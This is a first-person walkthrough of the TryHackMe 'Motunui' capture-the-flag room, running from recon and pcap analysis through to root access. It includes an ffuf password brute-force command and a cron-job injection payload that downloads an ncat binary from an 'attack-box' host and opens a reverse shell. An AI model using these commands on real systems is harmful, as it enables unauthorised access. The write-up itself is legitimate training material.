# Motunui

https://tryhackme.com/room/motunui

Quite a tricky room, but not toooo difficult?

Recon reveals this:

```
22/tcp   open  ssh         syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        syn-ack Apache httpd 2.4.29 ((Ubuntu))
139/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn syn-ack Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3000/tcp open  ppp?        syn-ack
5000/tcp open  ssl/http    syn-ack Node.js (Express middleware)
```

First step, the samba shares. Under there there were multiple pcap files, but only one (`ticket_6746`) that was more than 0 bytes.

Pulling this back and opening with wireshark revealed a mess of tls traffic, and one set of http traffic where a PNG file was downloaded. Extracting this revealed a domain: d3v3lopm3nt.motunui.thm

Using this with the port 80 port revealed a message that 'this site is for developers only' etc. Gobuster revealed /docs, which led to /docs/ROUTES.md, which revealed 'api.motunui.thm:3000/v2/' and three endpoints: POST /login, GET /jobs and POST /jobs

Login required a username/password apparently. Going to `/v1` rather than v2 revealed a username: maui. Using ffuf, I then brute forced the /v2/login endpoint:

`ffuf -w rockyou.txt -u http://api.motunui.thm:3000/v2/login -X POST -H "Content-Type: application/json" -d '{"username": "maui", "password": "FUZZ"}' -ac`

This quickly revealed the password for maui, and allowed me to get the hash.

Using the hash, I was able to call the jobs api which returned:

```json
{
  "job":"* * * * * echo \"They have stolen the heart from inside you, but that does not define you\" > /tmp/quote"
}
```

Calling the job api with POST, passing the hash and a new `job` parameter, I was able to use this to download a static ncat binary and use it to establish a reverse shell:

```json
{
  "job":"* * * * * wget http://attack-box/ncat && chmod +x ncat && ./ncat -e /bin/bash attack-box"
}
```

On the box were two user directories, moana and network, with the latter being what the samba share was bound to. Under moana was a note saying she reused passwords. Searching around I found two files owned by moana: network.pkt and ssl.txt, only the former was readable by www-root.

A .pkt file is a format readable by Cisco Packet Tracer, a network simulation tool. Kind of annoying: this is a niche tool, and installing any mess from that garbage fire of a company is a pain - accounts need to be created, weird pages used to download the tool, annoying 'trial periods' to get past (extra annoying giving I have no fucking interest in keeping this tool longer than the need for this challenge) but I was able to get the thing to read the file. After opening, going to `switch0`, then the CLI, then `en` and `run` got a log of moana's commands, revealing a password.

With this I could SSH in as moana and get the user flag. THe other file from before, ssl.txt was a ssl log file which, when used with wireshark (set it under preferences > protocols > TLS > log file) I was able to get the contents of the other streams in that original pcap, getting the root password and the root flag :)
